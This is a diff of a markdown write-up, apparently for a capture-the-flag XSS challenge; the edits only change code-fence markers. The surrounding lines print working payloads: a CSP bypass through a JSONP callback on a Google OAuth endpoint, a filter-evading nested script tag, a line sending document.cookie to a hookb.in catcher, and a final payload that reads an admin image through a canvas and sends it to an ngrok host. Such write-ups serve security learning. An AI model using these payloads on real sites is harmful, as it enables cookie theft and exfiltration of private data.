@@ -99,7 +99,7 @@ Riiight, the CSP won't let us inject inline script. What we can inject, on the o
 
 For instance, https://accounts.google.com/o/oauth2/revoke?callback=alert(31337); returns a script beginning with our payload, `alert(31337)`. Let's try it out:
 
-```html=
+```html
 <scri<script>pt src="https://accounts.google.com/o/oauth2/revoke?callback=alert(31337)"></scri</script>pt>
 ```
 
@@ -109,7 +109,7 @@ Now the fun begins. From now on, I will only show the callback scripts without t
 
 We build a classic payload to exfiltrate cookies:
 
-```js=
+```js
 window.location=encodeURI('https://hookb.in/lJRg9j0NMjfrXXZWdaRx?x='.concat(btoa(document.cookie)));
 ```
 
@@ -121,7 +121,7 @@ The admin did visit our link though, which is good news.
 
 The `Referrer` header is interesting: the admin comes from an **admin read page**. We can try **fetching the contents** of that page, as well as other pages (we can imagine there also is an `/admin/index.html`).
 
-```js=
+```js
 var xhr=new XMLHttpRequest();
 xhr.open('GET','/admin/',false);
 xhr.send();
@@ -266,7 +266,7 @@ For the second point, we can deal with it by setting up our own simple TCP serve
 
 For the first point, let me explain the issue. If you try to fetch the PNG the normal way with synchronous XMLHttpRequest as we've been doing since the beginning, `xhr.response` will contain the PNG contents, but...
 
-```=
+```
 ï¿½PNG
 .
 ...
@@ -298,7 +298,7 @@ But this solution did not work either, because CSP policy refused to load the wo
 
 I eventually thought of **loading the image through an actual `<img>` tag**. This way, maybe we can extract the contents of the image once it has been loaded. It turns out you can, by using a **canvas**. Here's how:
 
-```js=
+```js
 var img=new Image;
 img.crossOrigin='Anonymous';
 img.src='/admin/img/175193053491407376ff47dc6e834673.png';
@@ -315,7 +315,7 @@ The last issue we have to take care of is that the image should have finished lo
 
 Here is the final payload:
 
-```html=
+```html
 <scri<script>pt src="https://accounts.google.com/o/oauth2/revoke?callback=var img=new Image;img.crossOrigin='Anonymous';img.src='/admin/img/175193053491407376ff47dc6e834673.png';setTimeout(function(){var c=document.createElement('canvas');c.height=img.naturalHeight;c.width=img.naturalWidth;var ctx=c.getContext('2d');ctx.drawImage(img,0,0,c.width,c.height);window.location=encodeURI('http://ngrok.../?x='.concat(c.toDataURL());},3000);"></scri</script>pt>
 ```
 
